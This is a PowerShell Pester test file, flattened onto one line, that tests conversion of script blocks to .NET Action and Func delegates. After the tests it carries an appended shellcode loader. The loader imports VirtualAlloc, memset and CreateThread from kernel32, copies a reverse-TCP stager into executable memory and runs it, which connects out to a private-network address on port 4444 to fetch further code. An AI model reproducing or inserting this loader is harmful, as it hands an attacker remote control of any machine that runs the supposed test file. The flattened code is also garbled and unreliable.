Describe 'Test for conversion b/w script block and delegate' -Tags "CI" {BeforeAll {function lineno{$myInvocation.ScriptLineNumber}function Generate-ArgumentTypesAndParameters{param([int] $num, [ref] $parameters, [ref]$argumentTypes, [bool]$hasReturn = $false)For($j = 1; $j -le $num; $j++){$ran = Get-Random -Minimum 1 -Maximum 3$type = [Int32]switch ($ran){1 { $type = [Int32]; break}2 { $type = [string]; break}3 { $type = [Hashtable];  break}}$argumentTypes.Value += $type;if((-not $hasReturn) -or ($j -lt $num ) )  {$parameters.Value  += Get-Value($type)}}}function Get-Value{param([type] $t)if ($t -eq [Int32]) { 100 }elseif($t -eq [string]) { 'abc' }elseif ($t -eq [Hashtable])  {@{a = 'foo'} }}}It 'System.Action' {([System.Action]{ $script:gl=lineno; $args.Length | Should -Be 0 }).Invoke()($gl + 1) | Should -BeExactly (lineno)}For($i = 1; $i -le 8; $i++){$str = 'System.Action`{0}' -f $iContext $str {$gt = [object].Assembly.GetType($str)$parameters = @()$argumentTypes=@()Generate-ArgumentTypesAndParameters $i ([ref] $parameters) ([ref] $argumentTypes)$ct = $gt.MakeGenericType($argumentTypes)$func = { $script:gl=lineno; $args.Length | Should -BeExactly $i } -as $ct$func.DynamicInvoke($parameters)It '$gl + 2' { ($gl + 2) | Should -BeExactly (lineno) }}}It 'System.Func[Int32]' {([System.Func[Int32]]{ $script:gl=lineno; $args.Length }).Invoke() | Should -Be 0($gl + 1) | Should -BeExactly (lineno)}It 'System.Func[string]' {([System.Func[string]]{ $script:gl=lineno; 'hello' }).Invoke() | Should -BeExactly 'hello'($gl + 1) | Should -BeExactly (lineno)}It 'System.Func[hashtable]' {(([System.Func[hashtable]]{ $script:gl=lineno; @{a = 'foo' }}).Invoke()).a | Should -BeExactly 'foo'($gl + 1) | Should -BeExactly (lineno)}For($i = 2; $i -le 9; $i++){$str = 'System.Func`{0}' -f $iContext $str {$gt = [object].Assembly.GetType($str)$parameters = @()$argumentTypes=@()Generate-ArgumentTypesAndParameters $i ([ref] $parameters) ([ref] $argumentTypes) $true$v= Get-Value($argumentTypes[$i-1])$ct = $gt.MakeGenericType($argumentTypes)$func = { $script:gl=lineno; $null = ($args.Length | Should -BeExactly ($i-1)); $v } -as $ct$t = $func.DynamicInvoke($parameters)It '$gl + 2' { ($gl + 2) | Should -BeExactly (lineno) }if ($argumentTypes[$i-1] -eq [Hashtable] ){It '$t.a' { $t.a | Should -BeExactly $v.a }}else{It '$t' { $t | Should -BeExactly $v }}}}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x41,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};